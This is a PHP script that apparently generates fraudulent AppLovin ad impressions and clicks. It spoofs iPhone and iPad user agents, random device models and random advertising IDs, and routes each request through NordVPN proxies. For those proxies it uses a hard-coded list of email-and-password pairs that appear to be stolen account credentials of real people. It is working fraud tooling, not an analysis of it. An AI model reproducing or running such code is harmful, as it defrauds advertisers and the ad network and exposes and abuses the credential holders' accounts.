<?php
function guidv4($data)
{assert(strlen($data) == 16);
$data[6] = chr(ord($data[6]) & 0x0f | 0x40);
$data[8] = chr(ord($data[8]) & 0x3f | 0x80);
return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));}
function IPFuck()
{$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP))
{$ip = $client;}elseif(filter_var($forward, FILTER_VALIDATE_IP)){$ip = $forward;}
else{$ip = $remote;}return $ip;}
function getUA()
{
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$userAgent[] = "Mozilla/5.0 (iPad; CPU OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3.1 Mobile/15E148 Safari/604.1";
$UARand = array_rand($userAgent);return $userAgent[$UARand];}
function PROXY_USERPASS()
{$UserPass[] = "Jeff@irsolutions.com:jeff5257";
$UserPass[] = "yukonjonny@hotmail.com:vanessa1";
$UserPass[] = "richie_3@hotmail.com:acid8000";
$UserPass[] = "stephanielane3@msn.com:danelle1";
$UserPass[] = "charlesullman@hotmail.com:Crazyman";
$UserPass[] = "aliendogfarm@hotmail.com:sk8erboi";
$UserPass[] = "anthony.day@btinternet.com:oldbroms7th";
$UserPass[] = "benafc90@hotmail.com:Bedafc123";
$UserPass[] = "lizzytaylor@hotmail.com:1933051at";
$UserPass[] = "jonnyperks@hotmail.com:brookway";
$UserPassRand = array_rand($UserPass);return $UserPass[$UserPassRand];}
?>
<?php
function ApplovinJSON()
{
//Applovin SDK
$ApplovinSDK = file_get_contents('https://github.com/yusribjb/Applovin/raw/master/applovin_data.json');
$input = json_decode($ApplovinSDK);
// Proxy Config
$NordVPN = file_get_contents('https://github.com/yusribjb/Applovin/raw/master/NordVPN.json');
$arr = json_decode($NordVPN, true);
$RandServer = $arr[rand(0,count($arr)-1)];
$RandProxy = json_decode(json_encode($RandServer));
$proxy = $RandProxy->id.'.nordvpn.com:80';
$proxyauth = PROXY_USERPASS();
//============================================================
$UA = getUA();
$iPhone = Array('iPhone10,4','iPhone10,5','iPhone10,6','iPhone11,3','iPhone11,4','iPhone11,8','iPhone12,1','iPhone12,3','iPhone12,5','iPad11,2','iPad11,3','iPad11,4');
$iPad = Array('iPad11,2','iPad11,3','iPad11,4');
$versi = Array('13.3.1');
if(preg_match("/iPhone/", $UA)) {
$model = $iPhone[array_rand($iPhone)];}else{
$model = $iPad[array_rand($iPad)];}
$urlRand = Array('https://a.applovin.com/ad?sdk_key='.$input->SDK.'&package_name='.$input->PKG.'&format=json&platform=ios&zone_id='.$input->ZND.'&idfa='.guidv4(openssl_random_pseudo_bytes(16)).'&model='.$model.'&brand=apple&os='.$versi[array_rand($versi)].'&dnt=0&network=wifi&accept=video&gender=f&accept=video','https://a.applovin.com/ad?sdk_key='.$input->SDK.'&package_name='.$input->PKG.'&format=json&platform=ios&zone_id='.$input->ZND.'&idfa='.guidv4(openssl_random_pseudo_bytes(16)).'&model='.$model.'&brand=apple&os='.$versi[array_rand($versi)].'&dnt=0&network=wifi&accept=video&gender=f&accept=video&sdk_version='.$input->SDV.'');
$url = $urlRand[array_rand($urlRand)];
$ch = curl_init();
curl_setopt($ch, CURLOPT_USERAGENT, $UA);
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$x = curl_exec($ch);
curl_close($ch);
return json_encode($x, true);
}
$JSONData = json_decode(json_decode(ApplovinJSON()));
if(preg_match("/!/", $JSONData->clcode)) {
$UrlImpression = 'https://prod-a.applovin.com/imp?clcode='.$JSONData->clcode.'';}else{$UrlImpression = '/err';}
$ClickRand = Array(''.$JSONData->click_tracking_url.'','/err','/err','/err','/err','/err','/err','/err');
$UrlClick = $ClickRand[array_rand($ClickRand)];
for ($i = 1; $i <= 1; $i++) {
$NordVPN = file_get_contents('https://github.com/yusribjb/Applovin/raw/master/NordVPN.json');
$arr = json_decode($NordVPN, true);
$RandServer = $arr[rand(0,count($arr)-1)];
$RandProxy = json_decode(json_encode($RandServer));
$proxy = $RandProxy->id.'.nordvpn.com:80';
$proxyauth = PROXY_USERPASS();
$UA = getUA();
$url = $UrlImpression;
$ch = curl_init();
curl_setopt($ch, CURLOPT_USERAGENT, $UA);
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$x = curl_exec($ch);
echo $x;}
?>
<script type="text/javascript">
window.open('<?php echo $Click; ?>');
</script>
